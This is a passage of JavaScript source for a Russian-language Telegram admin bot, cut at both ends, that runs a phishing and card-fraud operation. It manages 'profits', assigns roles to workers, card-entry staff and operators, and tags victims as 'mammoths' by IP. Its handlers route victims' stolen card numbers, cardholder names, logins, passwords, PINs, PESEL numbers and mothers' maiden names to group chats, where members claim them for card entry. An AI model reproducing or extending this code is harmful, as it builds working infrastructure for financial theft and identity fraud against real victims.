                }profit_${profit_.id}_set_status_razvitie`
              ),
              Markup.callbackButton(
                locale.newProfit.wait,
                `profitAdmin_${
                  profit_.userId ? `user_${profit_.userId}_` : ""
                }profit_${profit_.id}_set_status_wait`
              ),
            ],
            [
              Markup.callbackButton(
                `❌ Удалить профит`,
                `admin_${
                  profit_.userId ? `user_${profit_.userId}_` : ""
                }profit_${profit_.id}_delete`
              ),
            ],
          ])
        )
        .catch((err) => err);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(
  /^admin_user_(\d+)_profit_(\d+)_set_status_(wait|payed|razvitie|lok)$/,
  async (ctx) => {
    try {
      const profit_ = await Profit.findByPk(ctx.match[2]);
      await profit_.update({
        status: {
          wait: 0,
          payed: 1,
          razvitie: 2,
          lok: 3,
        }[ctx.match[3]],
      });
      await ctx.telegram
        .editMessageReplyMarkup(
          ctx.state.bot.payoutsChannelId,
          profit_.channelMessageId,
          profit_.channelMessageId,
          Markup.inlineKeyboard([
            [Markup.callbackButton(locale.newProfit[ctx.match[3]], "none")],
          ])
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery("✅ Статус профита изменен", true)
        .catch((err) => err);
      return profit(ctx, profit_.id, profit_.userId);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);

adminBot.action(
  /^admin_user1_(\d+)_profit_(\d+)_set_status_(wait|payed|razvitie|lok)$/,
  async (ctx) => {
    try {
      const profit_ = await Profit.findByPk(ctx.match[2]);
      await profit_.update({
        status: {
          wait: 0,
          payed: 1,
          razvitie: 2,
          lok: 3,
        }[ctx.match[3]],
      });
      await ctx.telegram
        .editMessageReplyMarkup(
          ctx.state.bot.payoutsChannelId,
          profit_.channelMessageId,
          profit_.channelMessageId,
          Markup.inlineKeyboard([
            [Markup.callbackButton(locale.newProfit[ctx.match[3]], "none")],
          ])
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery("✅ Статус профита изменен", true)
        .catch((err) => err);
      // return profit(ctx, profit_.id, profit_.userId);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(
  /^admin_profit_(\d+)_set_status_(wait|payed|razvitie|lok)$/,
  async (ctx) => {
    try {
      const profit_ = await Profit.findByPk(ctx.match[1]);
      await profit_.update({
        status: {
          wait: 0,
          payed: 1,
          razvitie: 2,
          lok: 3,
        }[ctx.match[2]],
      });
      await ctx.telegram
        .editMessageReplyMarkup(
          ctx.state.bot.payoutsChannelId,
          profit_.channelMessageId,
          profit_.channelMessageId,
          Markup.inlineKeyboard([
            [Markup.callbackButton(locale.newProfit[ctx.match[2]], "none")],
          ])
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery("✅ Статус профита изменен", true)
        .catch((err) => err);
      return profit(ctx, profit_.id);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(/^admin_user_(\d+)_add_profit(?:_(\d+))?$/, async (ctx) => {
  try {
    const userId = ctx.match[1]; // ID пользователя
    const page = parseInt(ctx.match[2] || 1); // Текущая страница, по умолчанию 1

    const servicesPerPage = 20; // Количество сервисов на одной странице

    // Получаем все сервисы
    const allServices = await Service.findAll();

    // Удаляем дубликаты по коду сервиса
    const services = allServices.filter(
      (value, index, self) =>
        index === self.findIndex((v) => v.code === value.code)
    );

    // Рассчитываем количество страниц
    const totalPages = Math.ceil(services.length / servicesPerPage);

    // Получаем сервисы для текущей страницы
    const currentServices = services.slice(
      (page - 1) * servicesPerPage,
      page * servicesPerPage
    );

    // Создаем кнопки для сервисов на текущей странице
    const buttons = currentServices.map((v) =>
      Markup.callbackButton(
        v.title,
        `admin_user_${userId}_add_profit_${v.code}`
      )
    );

    // Кнопки для перехода между страницами
    const navigationButtons = [];
    if (page > 1) {
      navigationButtons.push(
        Markup.callbackButton(
          "◀️ Назад",
          `admin_user_${userId}_add_profit_${page - 1}`
        )
      );
    }
    if (page < totalPages) {
      navigationButtons.push(
        Markup.callbackButton(
          "➡️ Вперед",
          `admin_user_${userId}_add_profit_${page + 1}`
        )
      );
    }

    return ctx
      .replyOrEdit(`Выберите сервис (${services.length} всего)`, {
        reply_markup: Markup.inlineKeyboard([
          ...chunk(buttons, 2), // Разбиваем кнопки сервисов на строки по 2
          navigationButtons.length ? navigationButtons : [],
          [Markup.callbackButton(locale.go_back, `admin_user_${userId}`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(
  /^admin_user_(\d+)_add_profit_([A-Za-z0-9_]+)$/,
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: ctx.match[2],
        },
        include: [
          {
            association: "currency",
            required: true,
          },
        ],
      });

      const user = await User.findByPk(ctx.match[1]);
      if (!service) {
        await ctx
          .answerCbQuery("❌ Сервис не найден", true)
          .catch((err) => err);
        return user(ctx, ctx.match[1]);
      }
      if (!user) {
        await ctx
          .answerCbQuery("❌ Пользователь не найден", true)
          .catch((err) => err);
        return users(ctx);
      }

      return ctx.scene.enter("admin_add_profit", {
        userId: user.id,

        serviceTitle: service.title,
        currency: service.currency.code,
        mailer: false,
        mailer2: false,
        mailer3: false,
        mailer4: false,
        mailer5: false,
        mailer6: false,
        mailer7: false,
        mailer8: false,
        mailer9: false,

        sms: false,
        sms2: false,
        sms3: false,
        screen: false,
        screen2: false,
        screen3: false,
        screen4: false,
      });
    } catch (err) {
      console.log(err);
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(/^admin_user_(\d+)_ads_(\d+)$/, (ctx) =>
  userAds(ctx, ctx.match[1], ctx.match[2])
);
adminBot.action(/^admin_user_(\d+)_ad_(\d+)$/, (ctx) =>
  ad(ctx, ctx.match[2], ctx.match[1])
);
adminBot.action(/^admin_user_(\d+)_profits_(\d+)$/, (ctx) =>
  userProfits(ctx, ctx.match[1], ctx.match[2])
);
adminBot.action(/^admin_user_(\d+)_profit_(\d+)$/, (ctx) =>
  profit(ctx, ctx.match[2], ctx.match[1])
);
adminBot.action(/^admin_profit_(\d+)$/, (ctx) => profit(ctx, ctx.match[1]));

adminBot.action(/^admin_user_(\d+)_((un)?ban)$/, async (ctx) => {
  try {
    if (ctx.state.user.status == 2) {
      return ctx
        .answerCbQuery("❌ У вас нет прав для выполнения этой команды.", true)
        .catch((err) => err);
    }

    const userId = ctx.match[1];
    const action = ctx.match[2]; // "ban" или "unban"

    if (action === "ban" && ctx.from.id == userId) {
      return ctx
        .answerCbQuery("❌ Вы не можете заблокировать сами себя", true)
        .catch((err) => err);
    }

    const user_ = await User.findByPk(userId, {
      include: [{ association: "request" }],
    });

    if (!user_) {
      return ctx.answerCbQuery("❌ Пользователь не найден.", { show_alert: true });
    }

    await user_.update({ banned: action === "ban" });

    const request_ = await Request.findByPk(user_?.request?.id);
    const settings = await Settings.findByPk(1);

    if (action === "ban") {
      if (request_) await request_.update({ status: -1 });

      // Уведомление пользователю
      ctx.telegram.sendMessage(userId, locale.your_account_banned, {
        parse_mode: "HTML",
      }).catch((err) => err);

      // Кик из общего чата
if (settings?.allGroupId) {
  ctx.telegram.kickChatMember(settings.allGroupId, userId).catch(() => {});
}

    } else {
      if (request_) await request_.update({ status: 1 });

      ctx.telegram.sendMessage(userId, "✅ Ваш аккаунт разблокирован!", {
        parse_mode: "HTML",
      }).catch((err) => err);
    }

    log(
      ctx,
      `${user_.banned ? "заблокировал" : "разблокировал"} пользователя <b><a href="tg://user?id=${user_.id}">${user_.username}</a></b>`
    );

    return user(ctx, userId);
  } catch (err) {
    console.error("❌ Ошибка при бане/разбане:", err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

function generateStatusKeyboard(user) {
  const { id, status, isMentor, isOperator } = user;

  const createButton = (label, active, action) =>
    Markup.callbackButton(`${active ? "✅" : "☑️"} ${label}`, action);

  return Markup.inlineKeyboard([
    [
      createButton(
        "👑 Админ",
        status === 1,
        `admin_user_${id}_set_main_status_admin`
      ),
      createButton(
        "🚀 Профи",
        status === 3,
        `admin_user_${id}_set_main_status_pro`
      ),
    ],
    [
      createButton(
        "✍️ Вбивер",
        status === 2,
        `admin_user_${id}_set_main_status_writer`
      ),
      createButton(
        "👤 Воркер",
        status === 0,
        `admin_user_${id}_set_main_status_worker`
      ),
    ],
    [
      Markup.callbackButton("━━━━━━━━━━━━━━━", "no_action"), // разделитель
    ],
    [
      createButton(
        "🎓 Наставник",
        isMentor,
        `admin_user_${id}_toggle_nastavnik`
      ),
      createButton(
        "👨🏼‍💻 Оператор",
        isOperator,
        `admin_user_${id}_toggle_operator`
      ),
    ],
    [Markup.callbackButton("◀️ Назад", `admin_user_${id}`)],
  ]);
}

// Обработчик открытия статуса
adminBot.action(/^admin_user_(\d+)_edit_status$/, async (ctx) => {
  const userId = ctx.match[1];

  if (ctx.from.id == userId)
    return ctx
      .answerCbQuery("❌ Вы не можете изменить свой статус", true)
      .catch((err) => err);

 // Разрешено только статусу 1
  if (ctx.state.user.status !== 1) {
    return ctx
      .answerCbQuery("❌ У вас нет прав для выполнения этой команды.", true)
      .catch((err) => err);
  }


  const userRecord = await User.findByPk(userId);

  if (!userRecord) return ctx.reply("❌ Пользователь не найден");

  await ctx
    .replyOrEdit(`Выберите статус(ы)`, {
      reply_markup: generateStatusKeyboard(userRecord),
    })
    .catch((err) => err);
});

// Обработчик смены основного статуса
adminBot.action(
  /^admin_user_(\d+)_set_main_status_(admin|pro|writer|worker)$/,
  async (ctx) => {

    if (ctx.state.user.status !== 1) {
      return ctx
        .answerCbQuery("❌ У вас нет прав для выполнения этой команды.",true)
        .catch((err) => err);
    }
    const userId = ctx.match[1];
    const newRole = ctx.match[2];

    const statusMap = {
      admin: 1,
      writer: 2,
      pro: 3,
      worker: 0,
    };

    const newStatus = statusMap[newRole];
    const userRecord = await User.findByPk(userId);
    if (!userRecord) return ctx.reply("❌ Пользователь не найден");

    if (userRecord.status === 2 && newStatus !== 2) {
      await Writer.destroy({ where: { userId: userId } });
    }

    if (newStatus === 2) {
      await Writer.findOrCreate({
        where: { userId: userId },
        defaults: { username: userRecord.username },
      });
    }

    await userRecord.update({ status: newStatus });

    const updatedUser = await User.findByPk(userId);
    await ctx.editMessageReplyMarkup(generateStatusKeyboard(updatedUser));

    // Сообщение самому пользователю
    await ctx.telegram
      .sendMessage(
        userId,
        `🔔 Ваш основной статус изменён на: *${locale.roles[newRole]}*`,
        { parse_mode: "Markdown" }
      )
      .catch((err) => console.error(err));
  }
);

// Обработчик toggle наставника
adminBot.action(/^admin_user_(\d+)_toggle_nastavnik$/, async (ctx) => {
  const userId = ctx.match[1];
  const userRecord = await User.findByPk(userId);
  if (!userRecord) return ctx.reply("❌ Пользователь не найден");

  const isMentor = !userRecord.isMentor;
  await userRecord.update({ isMentor: isMentor });

  if (isMentor) {
    await Nastavniki.findOrCreate({
      where: { id: userId },
      defaults: { id: userId, username: userRecord.username, status: 1 },
    });
  } else {
    await Nastavniki.destroy({ where: { id: userId } });
    await User.update({ mentor: null }, { where: { mentor: userId } });
  }

  const updatedUser = await User.findByPk(userId);
  await ctx.editMessageReplyMarkup(generateStatusKeyboard(updatedUser));

  // Сообщение самому пользователю
  await ctx.telegram
    .sendMessage(
      userId,
      isMentor
        ? `🎓 *Вы назначены Наставником!*`
        : `🎓 *Роль Наставника снята с вас.*`,
      { parse_mode: "Markdown" }
    )
    .catch((err) => console.error(err));

  // await ctx.answerCbQuery(isMentor ? "✅ Наставник добавлен" : "❌ Наставник снят", true).catch((err) => err);
});

// Обработчик toggle оператора
adminBot.action(/^admin_user_(\d+)_toggle_operator$/, async (ctx) => {
  const userId = ctx.match[1];
  const userRecord = await User.findByPk(userId);
  if (!userRecord) return ctx.reply("❌ Пользователь не найден");

  const isOperator = !userRecord.isOperator;
  await userRecord.update({ isOperator: isOperator });

  if (isOperator) {
    await Operators.findOrCreate({
      where: { userId: userId },
      defaults: { userId: userId, username: userRecord.username, status: 1 },
    });
  } else {
    await Operators.destroy({ where: { userId: userId } });
    await User.update({ operator: null }, { where: { operator: userId } });
  }

  const updatedUser = await User.findByPk(userId);
  await ctx.editMessageReplyMarkup(generateStatusKeyboard(updatedUser));

  // Сообщение самому пользователю
  await ctx.telegram
    .sendMessage(
      userId,
      isOperator
        ? `👨🏼‍💻 *Вы назначены Оператором!*`
        : `👨🏼‍💻 *Роль Оператора снята с вас.*`,
      { parse_mode: "Markdown" }
    )
    .catch((err) => console.error(err));

  // await ctx.answerCbQuery(isOperator ? "✅ Оператор добавлен" : "❌ Оператор снят", true).catch((err) => err);
});

adminBot.action(/^admin_user_(\d+)_edit_percent_default$/, async (ctx) => {
  try {
    const user_ = await User.findByPk(ctx.match[1]);

    await user_.update({
      percent: null,
      percentType: null,
    });
    log(
      ctx,
      `установил стандартный процент воркера для пользователя <b><a href="tg://user?id=${user_.id}">${user.username}</a></b>`
    );
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_edit_percent_(allProfits|logs)$/, (ctx) => {
  // Проверяем статус пользователя
  if (ctx.state.user.status !== 1) {
    return ctx.answerCbQuery(
      "❌ У вас нет прав на выполнение этой команды.",
      true
    );
  }

  // Если статус 1, переходим в сцену
  return ctx.scene.enter("admin_user_edit_percent", {
    userId: ctx.match[1],
    percentType: ctx.match[2],
  });
});

adminBot.action(/^admin_user_(\d+)_select_percent_type$/, (ctx) => {
  if (ctx.state.user.status == 2) {
    return ctx
      .answerCbQuery("❌ У вас нет прав для выполнения этой команды.", true)
      .catch((err) => err);
  } else
    ctx
      .replyOrEdit(`💴 Выберите тип процента`, {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "💰 Со всех залетов",
              `admin_user_${ctx.match[1]}_edit_percent_allProfits`
            ),
          ],
          [
            Markup.callbackButton(
              "💳 Со вбитых логов",
              `admin_user_${ctx.match[1]}_edit_percent_logs`
            ),
          ],
          [
            Markup.callbackButton(
              `❌ Убрать процент`,
              `admin_user_${ctx.match[1]}_edit_percent_default`
            ),
          ],
          [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
        ]),
      })
      .catch((err) => err);
});

adminBot.command("countries", (ctx) => countries(ctx));
adminBot.action(/^admin_countries_(\d+)$/, (ctx) =>
  countries(ctx, ctx.match[1])
);
adminBot.command("services", (ctx) => services(ctx));
adminBot.action(/^admin_services_(\d+)$/, (ctx) => services(ctx, ctx.match[1]));
adminBot.command("ads", (ctx) => ads(ctx));
adminBot.action(/^admin_ads_(\d+)$/, (ctx) => ads(ctx, ctx.match[1]));
adminBot.action(/^admin_ad_(\d+)$/, (ctx) => ad(ctx, ctx.match[1]));
adminBot.action(/^admin_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad)
      return ctx
        .answerCbQuery("❌ Объявление не найдено", true)
        .catch((err) => err);

    await ad.destroy();
    log(
      ctx,
      `удалил объявление #${ad.id} пользователя <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>`
    );
    return ctx.replyOrEdit("✅ Объявление удалено", {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            "👤 Перейти к пользователю",
            `admin_user_${ad.userId}`
          ),
        ],
        [Markup.callbackButton(locale.go_back, `admin_ads_1`)],
      ]),
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_user_(\d+)_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findByPk(ctx.match[2], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad)
      return ctx
        .answerCbQuery("❌ Объявление не найдено", true)
        .catch((err) => err);

    await ad.destroy();
    log(
      ctx,
      `удалил объявление #${ad.id} пользователя <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>`
    );
    return ctx.replyOrEdit("✅ Объявление удалено", {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            "👤 Перейти к пользователю",
            `admin_user_${ctx.match[1]}`
          ),
        ],
        [
          Markup.callbackButton(
            locale.go_back,
            `admin_user_${ctx.match[1]}_ads_1`
          ),
        ],
      ]),
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("bins", (ctx) => bins(ctx));
adminBot.action(/^admin_bins_(\d+)$/, (ctx) => bins(ctx, ctx.match[1]));
adminBot.command("profits", (ctx) => profits(ctx));
adminBot.action(/^admin_profits_(\d+)$/, (ctx) => profits(ctx, ctx.match[1]));
adminBot.command("requests", (ctx) => requests(ctx));
adminBot.action(/^admin_requests_(\d+)$/, (ctx) => requests(ctx, ctx.match[1]));
adminBot.command("writers", (ctx) => writers(ctx));
adminBot.action(/^admin_writers_(\d+)$/, (ctx) => writers(ctx, ctx.match[1]));

adminBot.command("setrequestsgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      requestsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для заявок");
    return ctx
      .reply(
        `<b>✅ Группа для заявок установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setallgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      allGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу общего чата");
    return ctx
      .reply(`<b>✅ Общий чат установлен</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setsupportgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      supportChatId: ctx.chat.id,
    });
    log(ctx, "изменил группу общего чата");
    return ctx
      .reply(
        `<b>✅ Чат с жалобами установлен</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setlogsgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      logsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для логов");
    return ctx
      .reply(
        `<b>✅ Группа для логов установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setprivateloggroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      privateLogsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для приватных логов");
    return ctx
      .reply(
        `<b>✅ Группа для приватных логов установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setlogginggroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      loggingGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для логирования действий");
    return ctx
      .reply(
        `<b>✅ Группа для логирования действий установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setaccountinggroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      accountingChannelId: ctx.chat.id,
    });
    log(ctx, "изменил группу для подсчета бухгалтерии");
    return ctx
      .reply(
        `<b>✅ Группа для подсчета бухгалтерии установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setpayoutschannel", async (ctx) => {
  try {
    await ctx.state.bot.update({
      payoutsChannelId: ctx.chat.id,
    });

    log(ctx, "изменил канал для выплат");
    return ctx
      .reply(
        `<b>✅ Канал для выплат установлен</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

//logs
adminBot.action(/^log_(\d+)_wrong_(code|lk|picture|push)$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
        {
          association: "writer",
          required: true,
        },
      ],
    });

    const ipBinding = await IpBinding.findOne({
      where: {
        // adId: log.ad.id,
        ip: log.ip, // ← Чёткое соответствие!
      },
    });

    const mammothTag = ipBinding?.identifier
      ? `#${ipBinding.identifier}`
      : "отсутствует";

    if (!log)
      return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
    if (log.writerId && log.writerId != ctx.from.id)
      return ctx
        .answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true)
        .catch((err) => err);
    if (!log.writerId)
      await log.update({
        writerId: ctx.from.id,
      });

    await ctx.answerCbQuery("🔔 Воркер уведомлён").catch((err) => err);
    ctx.telegram
      .sendMessage(
        log.ad.userId,
        `<b>${locale.wrongWorkerStatuses[ctx.match[2]]} ${
          log.ad.service.title
        }</b>
        
✍️ Вбивер: <b>@${ctx.from.username}</b>

📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
   
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
         {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: false,
          }),
        }
      )
      .catch((err) => err);

    const user = await User.findOne({
      where: {
        id: log.ad.userId,
      },
    });

    const operator = await Operators.findOne({
      where: {
        userId: user.operator,
      },
    });

    ctx.telegram
      .sendMessage(
        operator.userId,
        `<b>${locale.wrongWorkerStatuses[ctx.match[2]]} ${
          log.ad.service.title
        }</b>

👤 Воркер: <b>${
          user.username ? `@${user.username}` : `Профиль (${log.ad.userId})`
        }</b>

✍️ Вбивер: <b>@${ctx.from.username}</b>
    
📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
         {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: true,
          }),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

adminBot.action(/^log_(\d+)_(myeror|myerorfield|photo|dep)$/, async (ctx) => {
  try {
    const logId = ctx.match[1];
    const actionType = ctx.match[2];

    if (actionType === "myeror") {
      return ctx.scene.enter("log_myerror", { logId });
    }

    if (actionType === "dep") {
      return ctx.scene.enter("log_dep", { logId });
    }

    if (actionType === "photo") {
      return ctx.scene.enter("log_photo", { logId });
    }

    return ctx.scene.enter("log_myerorfield", { logId });
  } catch (err) {
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

adminBot.action(/^log_(\d+)_lsLeave$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

    const ad = await Ad.findByPk(log.adId, {
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });

    await ctx.deleteMessage().catch((err) => err);
    if (log.chatMsg2) {
      await ctx.telegram
        .deleteMessage(ctx.from.id, log.chatMsg2)
        .catch((err) =>
          console.error(`Ошибка при удалении сообщения: ${err.message}`)
        );
    }
    // Обнуляем writerId только у этого лога
await Log.update(
  { writerId: null },
  {
    where: {
      adId: log.adId,
      writerId: ctx.from.id, // только его логи
    },
  }
);
    const user = await User.findOne({
      where: {
        id: ad.userId,
      },
    });

    const operator = await Operators.findOne({
      where: {
        userId: user.operator,
      },
    });

    const cardInfo = await getCardInfo(log.cardNumber);
    const bin = String(log.cardNumber).slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);

    // Получаем курсы USD и EUR из базы
    let usdRate = 1;
    let eurRate = 1;

    if (detectedCurrency) {
      const currencyFromDb = await Currency.findOne({
        where: { code: detectedCurrency },
      });
      if (currencyFromDb) {
        usdRate = parseFloat(currencyFromDb.usd) || 1;
        eurRate = parseFloat(currencyFromDb.eur) || 1;
      }
    }

    // Сохраняем валюту и курсы в лог
    log.detectedCurrency = detectedCurrency || log.ad.service.currency.code;
    log.usdRate = usdRate;
    log.eurRate = eurRate;

    const ipBinding = await IpBinding.findOne({
      where: {
        // adId: log.ad.id,
        ip: log.ip, // ← Чёткое соответствие!
      },
    });

    const mammothTag = ipBinding?.identifier
      ? `#${ipBinding.identifier}`
      : "отсутствует";

    // Уведомление в группу логов
    await ctx.telegram.sendMessage(
      ctx.state.bot.logsGroupId,
      `<b>❌ Вбивер @${ctx.from.username} отказался от лога ${
        log.ad.user.hideService == true ? "🏴" : log.ad.service.title
      }</b>

💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <b>${log.cardNumber}</b>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${
        ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
      }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)],
          [Markup.callbackButton("💳 Выдать лог ", `enter_${log.id}`)],
        ]),
      }
    );

   // Уведомление воркеру в ЛС
    await ctx.telegram.sendMessage(
      ad.userId, // ID воркера
      `<b>❌ Вбивер @${ctx.from.username} отказался от лога ${log.ad.service.title}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
      {
        parse_mode: "HTML",
      }
    );

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      if (operator) {
        await ctx.telegram.sendMessage(
          operator.userId,
          `<b>❌ Вбивер @${ctx.from.username} отказался от лога ${
            log.ad.service.title
          }</b>

👤 Воркер: <b>${
            user.username ? `@${user.username}` : `Профиль (${ad.userId})`
          }</b>

📦 Объявление: <b>${ad.title ?? "Без названия"}</b>
💰 Цена: <b>${ad.price ?? "отсутствует"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
          {
            parse_mode: "HTML",
           
          }
        );
      }
    }
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

adminBot.action(/^log_(\d+)_lsLeaveLk$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

    if (!log) {
      return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
    }

    const ad = await Ad.findByPk(log.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
        {
          association: "user",
          required: true,
        },
      ],
    });

    if (!ad) {
      return ctx
        .answerCbQuery("❌ Объявление не найдено", true)
        .catch((err) => err);
    }

    await ctx.deleteMessage().catch((err) => err);

    // Обнуляем writerId только у этого лога
await Log.update(
  { writerId: null },
  {
    where: {
      adId: log.adId,
      writerId: ctx.from.id, // только его логи
    },
  }
);

    // Формирование данных для сообщения
    const data = {
      phone: log.otherInfo.phone
        ? escapeHTML(String(log.otherInfo.phone).trim())
        : null,
      login: log.otherInfo.login
        ? escapeHTML(String(log.otherInfo.login).trim())
        : null,
      password: log.otherInfo.password
        ? escapeHTML(String(log.otherInfo.password).trim())
        : null,
      pesel: log.otherInfo.pesel
        ? escapeHTML(String(log.otherInfo.pesel).trim())
        : null,
      pin: log.otherInfo.pin
        ? escapeHTML(String(log.otherInfo.pin).trim())
        : null,
      motherlastname: log.otherInfo.motherlastname
        ? escapeHTML(String(log.otherInfo.motherlastname).trim())
        : null,
      bank: log.otherInfo.bank
        ? escapeHTML(String(log.otherInfo.bank).trim())
        : null,
    };

    const translatedFields = {
      phone: "Номер телефона",
      login: "LOGIN",
      password: "PASSWORD",
      pesel: "Песель",
      pin: "PIN",
